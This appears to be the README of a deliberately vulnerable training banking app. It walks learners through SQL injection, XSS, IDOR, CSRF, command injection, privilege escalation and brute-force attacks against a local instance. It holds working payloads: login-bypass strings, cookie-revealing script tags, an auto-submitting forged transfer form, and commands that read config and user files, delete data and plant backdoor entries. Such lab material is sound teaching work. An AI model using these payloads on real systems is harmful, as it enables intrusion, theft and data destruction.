# InsecureBank - Learn Cybersecurity Through Practice

A **deliberately broken** banking website designed to teach cybersecurity by letting you practice real attacks safely.

## ⚠️ Important Warning

**This website is INTENTIONALLY vulnerable!** 
- Only use it for learning cybersecurity
- Never use these techniques on real websites (that's illegal!)
- Run this only on your own computer

---

## 🚀 Quick Setup

### Step 1: Install and Run
1. **Download this project**
2. **Install dependencies:**
   ```bash
   # Backend (API server)
   cd backend
   npm install
   npm start
   
   # Frontend (Website)
   cd vul-bank-app
   npm install
   npm run dev
   ```
3. **Open your browser:** `http://localhost:5173`

### Step 2: Database Setup
- Follow instructions in `demo-files/DATABASE_SETUP_GUIDE.md`
- Choose either CleverCloud (online) or XAMPP (local)

---

## 👥 Test Users (Login Credentials)

| Username | Password | What they are |
|----------|----------|---------------|
| `admin` | `admin123` | Bank Administrator |
| `john_doe` | `password` | Regular Customer |
| `jane_smith` | `123456` | Regular Customer |
| `bob_wilson` | `Bobbbb` | Regular Customer |
| `ycp27` | `ycp123` | Regular Customer |

---

## 🎯 Cybersecurity Attacks You Can Practice

### 1. **SQL Injection** - Bypass Login Without Password

**What it is:** Tricking the database by inserting special code into login forms.

#### **Working SQL Injection Commands:**

**Username Field Injections:**
1. **Basic Bypass:** `admin' OR 1=1 --`
2. **Comment Bypass:** `admin'--`
3. **Union Extraction:** `' UNION SELECT * FROM users --`

**Password Field Injections:**
1. **Basic Bypass:** `' OR 1=1 --`

#### **How to Test:**

**Method 1 - Username Bypass:**
1. **Username:** `admin' OR 1=1 --`
2. **Password:** `anything`
3. **Result:** Bypasses authentication completely

**Method 2 - Password Bypass:**
1. **Username:** `admin`
2. **Password:** `' OR 1=1 --`
3. **Result:** Bypasses password check

**Method 3 - Data Extraction:**
1. **Username:** `' UNION SELECT * FROM users --`
2. **Password:** `anything`
3. **Result:** Attempts to extract user data

**Why it works:** The `OR 1=1` makes the condition always true, and `--` comments out the rest of the query.

---

### 2. **Cross-Site Scripting (XSS)** - Inject Malicious Code

**What it is:** Putting harmful code into websites that runs when others visit.

**Method 1 - Profile XSS:**
1. Login as any user
2. Go to your Profile page
3. In the **Full Name** field, paste: `<img src=x onerror=alert('HACKED!')>`
4. Save your profile
5. **Result:** Every time someone views your profile, they see a "HACKED!" popup

**Method 2 - Transfer Page XSS:**
1. Login to the bank (use SQL injection: `admin' OR 1=1 --`)
2. Go to **Transfer Money** page
3. In the **Search Users** field, paste: `<img src=x onerror=alert('XSS in Search!')>`
4. Click Search
5. **Result:** The malicious script executes immediately!

**More XSS examples to try:**
```html
<script>alert('Your session: ' + document.cookie)</script>
<img src=x onerror=alert('XSS Attack Successful')>
<svg onload=alert('SVG XSS')>
<iframe src=javascript:alert('iframe XSS')>
```

---

### 3. **IDOR (Insecure Direct Object Reference)** - Access Other People's Data

**What it is:** Viewing or changing other users' information by changing numbers in URLs.

**How to do it:**
1. Login as `john_doe` (user ID 2)
2. Open your browser's **Developer Tools** (Press F12)
3. Go to **Console** tab
4. Paste this code and press Enter:
```javascript
fetch('http://localhost:5000/api/transactions/1', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```
5. **Result:** You can see admin's transactions even though you're not admin!

**View any user's profile:**
```javascript
fetch('http://localhost:5000/api/user/1', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```

---

### 4. **CSRF (Cross-Site Request Forgery)** - Force Users to Do Things

**What it is:** Tricking logged-in users into performing actions without knowing.

**How to do it:**
1. Create a new file called `attack.html` on your computer
2. Put this code in it:
```html
<!DOCTYPE html>
<html>
<head><title>You Won $1000!</title></head>
<body>
    <h1>Congratulations! Click here to claim your prize!</h1>
    <form id="sneaky" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">
        <input name="fromUserId" value="2">
        <input name="toUsername" value="ycp27">
        <input name="amount" value="1000">
        <input name="description" value="CSRF Attack - You've been hacked!">
    </form>
    <script>
        // Automatically submit the form after 2 seconds
        setTimeout(() => {
            document.getElementById('sneaky').submit();
            alert('Money transferred! You have been victims of CSRF attack!');
        }, 2000);
    </script>
</body>
</html>
```
3. Have someone who's logged into the bank open this file
4. **Result:** Money gets transferred from their account without them knowing!

---

### 5. **Command Injection** - Control the Server

**What it is:** Making the server run commands by inserting special code.

**How to do it:**
1. Login to the bank (use SQL injection: `admin' OR 1=1 --`)
2. Go to **Transaction History** page
3. In the **Search Transactions** field, type any of these commands:
4. Submit
5. **Result:** The server executes your commands!

**Database Attacks:**
```bash
dump_users                         # Show all user data
show_database                      # Display database info
```

**File Discovery:**
```bash
dir                               # List current directory
dir *.json                        # Find JSON files
dir *.env                         # Find environment files
dir *.txt                         # Find text files
dir *.js                          # Find JavaScript files
dir /s *.config                   # Find config files recursively
```

**Data Theft:**
```bash
type users.json                   # Read user database
type transactions.json            # Read transaction data
type config.env                   # Read configuration
type admin_notes.txt              # Read admin notes
type package.json                 # Read project info
type .gitignore                   # Read git ignore file
```

**System Reconnaissance:**
```bash
whoami                           # Current user
ver                              # Windows version
ipconfig                         # Network configuration
systeminfo                       # System information
net user                         # List users
tasklist                         # Running processes
set                              # Environment variables
echo %PATH%                      # System PATH
hostname                         # Computer name
```

**File Operations:**
```bash
copy users.json stolen_data.txt   # Copy sensitive files
del users.json                    # Delete user database
ren config.env backup.env         # Rename files
mkdir hidden_folder               # Create directories
move transactions.json temp.bak   # Move files
attrib +h admin_notes.txt         # Hide files
```

**Backdoor Creation:**
```bash
echo {"backdoor":"created"} > hack.json
echo admin2:password123 >> users.txt
echo @echo off > backdoor.bat
copy con malware.txt
```

**Network Reconnaissance:**
```bash
netstat -an                      # Network connections
arp -a                           # ARP table
route print                      # Routing table
nslookup google.com              # DNS lookup
ping -n 1 127.0.0.1             # Ping localhost
ipconfig /all                    # Full network config
```

---

### 6. **Privilege Escalation** - Access Admin Features

**What it is:** Regular users accessing admin-only features.

**How to do it:**
1. Login as a regular user (not admin)
2. Open Developer Tools (F12) → Console
3. Try to access admin data:
```javascript
fetch('http://localhost:5000/api/admin/users', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```
4. **Result:** You can see all users' data even though you're not admin!

**Delete other users:**
```javascript
fetch('http://localhost:5000/api/admin/user/3', {
  method: 'DELETE',
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```

---

### 7. **Session Hijacking** - Steal Login Sessions

**What it is:** Stealing someone's login session to impersonate them.

**How to do it (Method 1 - Cookie Theft):**
1. Use XSS attack to steal cookies
2. In profile, enter: `<img src=x onerror="alert('Your session cookie: ' + document.cookie)">`
3. When someone views your profile, their session cookie is revealed

**How to do it (Method 2 - Manual Cookie Change):**
1. Press F12 → Application tab → Cookies
2. Find the cookies for localhost:5173
3. Change any `userId` value to `1` (admin's ID)
4. Refresh the page
5. **Result:** You might gain admin access!

---

### 8. **Brute Force Attack** - Guess Passwords

**What it is:** Trying many passwords until you find the right one.

**How to do it:**
1. Open Developer Tools (F12) → Console
2. Paste this code:
```javascript
const passwords = ['admin', 'admin123', 'password', '123456', 'qwerty', 'letmein'];

async function hackPassword() {
    console.log('Starting password attack...');
    
    for (let pwd of passwords) {
        console.log(`Trying password: ${pwd}`);
        
        const response = await fetch('http://localhost:5000/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                username: 'admin', 
                password: pwd 
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log(`SUCCESS! Password found: ${pwd}`);
            alert(`Password cracked! Admin password is: ${pwd}`);
            break;
        }
        
        // Wait 1 second between attempts
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

hackPassword();
```
3. **Result:** The script will find the admin password automatically!

---

### 9. **Information Disclosure** - Find Hidden Data

**What it is:** Discovering sensitive information that shouldn't be visible.

**How to do it:**
1. Open any page on the bank website
2. Press F12 → Network tab
3. Click around the website (login, view profile, etc.)
4. **Look at the API responses**
5. **Result:** You can see passwords, internal data, and sensitive information!

**Direct API exploration:**
```javascript
fetch('http://localhost:5000/api/search?query=admin', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```

---

## 🛡️ What You'll Learn

By practicing these attacks, you'll understand:
- How hackers break into websites
- Why input validation is important
- How to protect against common attacks
- Real cybersecurity vulnerabilities
- How to think like a security tester

---

## 📚 Want to Learn More?

- **OWASP Top 10**: Common web vulnerabilities → [owasp.org/Top10](https://owasp.org/Top10/)
- **PortSwigger Academy**: Free cybersecurity courses → [portswigger.net/web-security](https://portswigger.net/web-security)

---

## 🎓 Educational Use Only

**Remember:**
- ✅ Use this to learn cybersecurity
- ✅ Practice on your own computer
- ✅ Share knowledge responsibly
- ❌ Never attack real websites
- ❌ Don't use this knowledge illegally

**Happy Learning! 🚀**
